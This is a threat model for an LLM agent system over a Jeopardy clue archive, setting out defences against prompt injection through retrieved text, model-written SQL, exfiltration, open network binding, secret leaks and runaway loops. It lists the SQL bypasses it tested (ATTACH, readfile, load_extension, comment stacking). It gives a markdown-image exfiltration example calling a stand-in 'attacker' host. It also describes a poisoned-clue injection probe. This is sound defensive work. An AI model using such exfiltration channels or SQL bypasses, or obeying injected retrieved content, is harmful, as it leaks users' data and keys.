# Threat model

Scoped to the agent system in `agents/`. The FastAPI harness in `app/` is
covered only where the two touch.

## The honest headline

**Prompt injection has no complete solution.** Nothing in `app/security.py`
should be read as prevention. Two *architectural* properties are doing the
real work here, and every heuristic is defence in depth on top of them:

1. **No egress.** No agent has an HTTP-fetch, file-write, email or webhook
   tool. Verified by grep across `agents/`. Data access + untrusted content
   + a way to send data out is what turns injection into a breach; without
   the third, the realistic worst case is a wrong answer and wasted quota.
2. **Read-only data.** The SQL tool opens SQLite `mode=ro&immutable=1`, so
   model-authored SQL cannot mutate anything even if the allowlist leaked.

## What changed when ADK arrived

Before: `/jeopardy2/config` reports `"wired_into_prompt": false`. Retrieval
existed but never entered a prompt, so the FastAPI path had **no**
retrieval-injection surface.

After: `agents/` is the first place in this project where **untrusted
retrieved text reaches a model that holds tools**. That is the change, not
the addition of a third provider.

## Assets, and who might want them

| Asset | Realistic threat |
|---|---|
| API keys (OpenAI, Anthropic, Google) | theft → billed usage |
| Clue archive | low value; already public-ish, but redistribution-restricted |
| The A2A judge endpoint | free LLM inference on your key |
| Quota | denial of wallet: free tier is 20 req/day/model |

## Surfaces and controls

### 1. Untrusted content in a tool-using context

Archive text flows index → tool result → model context, and that model can
call `query_clues` and `transfer_to_agent`.

- `wrap_untrusted` fences it with a sentinel the content cannot forge (the
  fence is stripped from content before wrapping — tested).
- `UNTRUSTED_CONTENT_RULE` in the agent instruction says the fenced region
  is data and must never change tool choice.
- `scan_for_injection` flags instruction-shaped patterns and surfaces a
  warning to the model rather than passing them silently.

Limits: a denylist, and denylists leak. Jeopardy clues are TV text so
deliberate poisoning is unlikely *today* — but `DATASET_PATH` accepts any
TSV, and the threat model flips the day anything user-submitted is indexed.

### 2. Model-authored SQL

The model writes the SQL that runs against the database. Tested bypasses,
all blocked: `ATTACH`, `readfile`, `writefile`, `load_extension` (SQLite
itself returns "not authorized"), case evasion, comment-stacked statements,
`WITH ... DELETE`. Reads are capped at 50 rows.

The load-bearing control is the read-only connection, not the regex.

### 3. Exfiltration

None available today — no egress tool. The control that matters is
preventive: **do not add one without revisiting this document.** An
HTTP-fetch tool or a webhook converts every item above from annoyance to
breach.

`scan_for_exfiltration` checks model *output* for the markdown-image
channel (`![](https://attacker/?d=...)`), data URIs, and URLs carrying long
query payloads. This matters because rendering such a string in a browser
is a silent outbound GET — no click required. `agents/run_demo.py` and the
minimal agent exit non-zero if output trips it.

### 4. Unauthenticated network exposure

`to_a2a` provides **no inbound authentication at all**. Uvicorn defaults to
`127.0.0.1`, but `--host 0.0.0.0` is reflexive in a Dockerfile, and bound
there the judge is an open LLM proxy on your key.

`check_bind_host` raises at import unless `A2A_ALLOW_PUBLIC_BIND=true`.

### 5. Secrets in artifacts

`docs/runs/*.log` is committed, so the trace is a publication path.
`redact_secrets` runs inside the trace formatter, covering `sk-`, `sk-ant-`,
`AIza`, `AQ.`, `ghp_` and bearer tokens.

Related, and learned the hard way: a file named `*api_key*` in the working
tree was swept into a commit by `git add -A` and stopped only by GitHub's
push protection. `.gitignore` now covers `*api_key*`, `*_token`, `*.pem`,
`*.key`.

### 6. Runaway loops

ADK defaults to 500 LLM calls per run. `RunConfig(max_llm_calls=...)` is set
to 8 (single agent) and 20 (router). This is a security control as much as a
cost one: the cheapest attack on a metered agent is making it loop.

## What is measured, and what is not

`scripts/injection_probe.py` runs a control/treatment comparison with a
poisoned clue and a canary word, the same shape as the ASCII-rule
measurement.

Result so far (`docs/runs/injection_probe.log`): with `gemini-3.5-flash-lite`,
n=1 per arm, the naive injection **failed against both arms**. So the run
does not show the defences changed the outcome. The only observable
difference was that the defended run reported the attempt to the user.

**n=1 is not a measurement.** What exists today is a working harness, not
evidence of effectiveness. Re-run with higher `--trials` and stronger
payloads before claiming anything.

## Not addressed

- No authentication or rate limiting on the FastAPI app itself.
- `FAULT_INJECTION_ENABLED=true` by default; fine locally, wrong in public.
- No sandboxing of the MCP subprocess beyond the read-only DB handle.
- Embedding inversion: vectors partially reconstruct their source text, so
  `data/chroma/` is treated as clue data and gitignored accordingly.
